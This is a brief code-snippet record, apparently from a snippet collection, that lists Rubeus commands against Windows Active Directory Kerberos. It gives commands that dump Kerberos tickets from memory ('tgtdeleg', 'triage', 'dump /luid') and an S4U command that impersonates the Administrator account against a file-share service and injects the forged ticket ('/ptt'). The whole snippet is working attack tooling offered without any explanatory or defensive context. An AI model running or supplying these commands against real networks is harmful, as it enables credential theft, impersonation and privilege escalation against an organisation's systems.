---
id: 236cf1a7-ed78-4af0-9822-529a1ae7f3a9
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:07.695532+00:00'
updated_at: '2023-04-10T20:26:26.275782+00:00'
---

# Code Snippet 236cf1a7

**Language**: ps1

```ps1
# Dump ticket
Rubeus.exe tgtdeleg /nowrap
Rubeus.exe triage
Rubeus.exe dump /luid:0x12d1f7

# Create a ticket
Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:cifs/srv.domain.local /ticket:doIFRjCCBUKgAwIBB...BTA== /ptt
```
